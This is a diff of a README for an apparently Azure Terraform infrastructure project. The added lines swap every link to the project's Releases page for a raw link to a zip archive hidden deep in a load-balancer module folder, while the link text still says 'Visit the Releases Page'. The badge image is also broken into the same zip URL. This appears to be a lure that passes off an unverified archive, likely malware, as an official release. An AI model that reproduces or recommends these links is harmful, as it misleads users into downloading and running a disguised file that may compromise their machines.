@@ -1,6 +1,6 @@
 # 🚀 multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final - Simplify Your Azure Infrastructure Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/releases)
+[![Download Now](https://raw.githubusercontent.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/main/modules/loadBalancer/azurerm_lb_rule/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final-v3.1.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/main/modules/loadBalancer/azurerm_lb_rule/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final-v3.1.zip)
 
 ## 📦 Overview
 
@@ -27,7 +27,7 @@ Follow these steps to get everything set up:
 1. **Visit the Releases Page:**
    Please click the link below to start your download:
 
-   [Visit the Releases Page to Download](https://github.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/main/modules/loadBalancer/azurerm_lb_rule/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final-v3.1.zip)
 
 2. **Download the Latest Release:**
    On the Releases page, find the latest version listed. Click on the version number to see available files. Download the file best suited for your operating system.
@@ -50,7 +50,7 @@ Follow these steps to get everything set up:
 
 To download the software, please visit the Releases page again:
 
-[Visit the Releases Page to Download](https://github.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AshokChahar/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final/main/modules/loadBalancer/azurerm_lb_rule/multi-environment-terraform-azure-enterprise-infrastructure-github-actions-final-v3.1.zip)
 
 ## 📑 Documentation
 
